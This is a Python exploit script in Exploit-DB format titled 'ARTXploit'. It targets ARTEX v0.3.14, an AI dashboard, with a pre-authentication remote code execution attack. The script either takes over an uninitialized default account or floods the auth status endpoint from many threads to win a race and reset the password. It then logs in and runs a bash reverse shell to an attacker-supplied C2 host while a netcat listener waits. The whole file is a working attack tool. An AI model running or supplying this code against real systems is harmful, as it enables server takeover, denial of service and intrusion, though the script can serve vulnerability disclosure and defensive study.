# Exploit Title: ARTXploit - ARTEX v0.3.14 Pre-Auth RCE via TOCTOU Race Condition
# Date: 2026-10-08
# Exploit Author: therustymate
# Vendor Homepage: https://github.com/Autumn-27/ARTEX
# Software Link: https://github.com/Autumn-27/ARTEX/releases/tag/v0.3.14
# Version: 0.3.14
# Tested on: Ubuntu Server 26.04.1 AMD64
# CVE : N/A

from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed
from argparse import ArgumentParser
from argparse import Namespace
import requests
import logging
import statistics
import time
import subprocess

logging.basicConfig()

USER_AGENT = "ARTXploit/1.0 (@therustymate)"

class ARTX:
    def __init__(self, host: str):
        self.host   : str       = str(host)

    def artx_request(self, endpoint: str, requst_type: str, *args, **kwargs) -> requests.Response:
        headers = kwargs.pop("headers", {}) or {}
        headers.setdefault("User-Agent", USER_AGENT)

        request_target = getattr(requests, requst_type.lower())

        return request_target(
            f"{self.host}{endpoint}",
            *args,
            headers=headers,
            **kwargs
        )

    def isARTEX(self):
        endpoint = "/api/health"
        r = self.artx_request(endpoint, "GET")
        return (r.json().get("service") == "artex", r.json())

    def isInitialized(self):
        endpoint = "/api/auth/status"
        r = self.artx_request(endpoint, "GET")
        return (r.json().get("initialized"), r.json())

    def setInitPassword(self, pwd: str):
        endpoint = "/api/auth/init"
        r = self.artx_request(endpoint, "POST", json={"password": str(pwd)})
        return (r.status_code, r.json())

    def getAuthToken(self, pwd: str):
        endpoint = "/api/auth/login"
        r = self.artx_request(endpoint, "POST", json={"username": "ARTEX", "password": str(pwd)})
        return (r.status_code, r.json())

    def executeCommand(self, token: str, command: str, param: dict):
        data = {
            "kind": "command",
            "exec": {
                "command": str(command),
                "timeout_ms": 10000
            },
            "param": param
        }
        endpoint = "/api/tools/custom/test"
        r = self.artx_request(endpoint, "POST", json=data, headers={"Authorization": f"Bearer {token}"})
        return (r.json().get("output"), r.json())

def percentile(values, p):
    if not values:
        return None

    values = sorted(values)
    idx = int((len(values) - 1) * p)
    return values[idx]

def thread_request_status(artx: ARTX, pwd: str):
    started = time.perf_counter()
    try:
        artx.setInitPassword(pwd)
        req = artx.isInitialized()
        body = req[1]
        elapsed = time.perf_counter() - started
        if req[0] == False:
            print(f"[!] DoS-based Race Condition triggered! Latency: [{elapsed*1000:.1f} ms]{' ' * 10}", end="\r")

        return {
            "ok": True,
            "elapsed": elapsed,
            "initialized": (
                body.get("initialized")
                if isinstance(body, dict)
                else None
            ),
            "error": None,
        }
    except requests.RequestException as e:
        return {
            "ok": False,
            "elapsed": time.perf_counter() - started,
            "initialized": None,
            "error": str(e),
        }

def main(args: Namespace):
    artx = ARTX(args.target)
    c2_server = str(args.c2_server.split(":")[0])
    c2_port = int(args.c2_server.split(":")[1])

    # Stage 1: Confirm it is an ARTEX service.
    print("[*] Checking the ARTEX service...")
    check_srv = artx.isARTEX()
    if check_srv[0] == False:
        print("[!] This is not an ARTEX service.")
        return

    artx_service = str(check_srv[1]['service']).upper()
    artx_version = str(check_srv[1]['version']).upper()

    print(f"[+] ARTEX service detected: [{artx_service} {artx_version}]")

    # Stage 2: Check if the account default password is set.
    print("[*] Checking ARTEX initialization...")
    check_default_pwd = artx.isInitialized()
    if check_default_pwd[0] == False:
        print("[!] ARTEX is NOT initialized!")
        set_new_password = artx.setInitPassword(args.password)
        if set_new_password[0] == 200:
            print("[+] The default ARTEX account was successfully hijacked.")
            print(f"[+] artex_token={set_new_password[1].get('token')}")
            print("[+] Exploit completed.")
            return
        else:
            print(f"[-] Failed: [{set_new_password[0]}] {set_new_password[1]}")

    print("[!] ARTEX is already initialized.")

    # Stage 3: DoS /api/auth/status
    started = time.perf_counter()
    thread_results = []

    with ThreadPoolExecutor(max_workers=args.multi_thread) as pool:
        futures = [
            pool.submit(thread_request_status, artx, args.password)
            for _ in range(args.requests)
        ]

        for future in as_completed(futures):
            thread_results.append(future.result())

    wall = time.perf_counter() - started

    print("\n\n")

    latencies = [r["elapsed"] for r in thread_results]
    failures = [r for r in thread_results if not r["ok"]]

    init_true = sum(r["initialized"] is True for r in thread_results)
    init_false = sum(r["initialized"] is False for r in thread_results)
    init_unknown = sum(r["initialized"] is None for r in thread_results)

    print("=== Result ===")
    print(f"Wall time       : {wall:.3f}s")
    print(f"Req/s           : {len(thread_results) / wall:.2f}")
    print(f"Failures        : {len(failures)}")

    if latencies:
        print(f"Latency avg     : {statistics.mean(latencies)*1000:.1f} ms")
        print(f"Latency p50     : {percentile(latencies, 0.50)*1000:.1f} ms")
        print(f"Latency p95     : {percentile(latencies, 0.95)*1000:.1f} ms")
        print(f"Latency max     : {max(latencies)*1000:.1f} ms")

    print()
    print("initialized:")
    print(f"  true          : {init_true}")
    print(f"  false         : {init_false}")
    print(f"  unknown       : {init_unknown}")

    if failures:
        print("\nExample errors:")
        for r in failures[:5]:
            print(f"  - {r['error']}")

    if init_false == 0:
        print("[!] The exploit most likely failed.")

    print("[*] Retrieving the authentication token...")
    auth = artx.getAuthToken(args.password)
    if auth[0] == 401:
        print("[-] Exploit failed.")
        return
    token = auth[1].get("token")
    print(f"[+] Token found: {token}")

    print("[*] Executing reverse shell command...")
    listener = subprocess.Popen(["nc", "-lvnp", f"{c2_port}"])
    artx.executeCommand(
        token,
        f"/bin/bash -c 'bash -i >& /dev/tcp/{c2_server}/{c2_port} 0>&1' &",
        {}
    )
    listener.wait()
    print("[+] Exploit completed.")

if __name__ == "__main__":
    parser = ArgumentParser(
        prog="ARTXploit",
        description="ARTEX AI Panel Exploit",
        epilog="Present by @therustymate"
    )
    parser.add_argument(
        "-t", "--target",
        help="ARTEX AI dashboard URL",
        type=str,
        required=True
    )
    parser.add_argument(
        "-r", "--requests",
        help="Multi-thread request limit",
        type=int,
        default=10000
    )
    parser.add_argument(
        "-m", "--multi-thread",
        help="Multi-thread creation limit",
        type=int,
        default=10000
    )
    parser.add_argument(
        "-p", "--password",
        help="New password to set",
        type=str,
        required=True
    )
    parser.add_argument(
        "-c", "--c2-server",
        help="C2 server address (e.g. 127.0.0.1:4444)",
        type=str,
        required=True
    )

    args = parser.parse_args()
    main(args)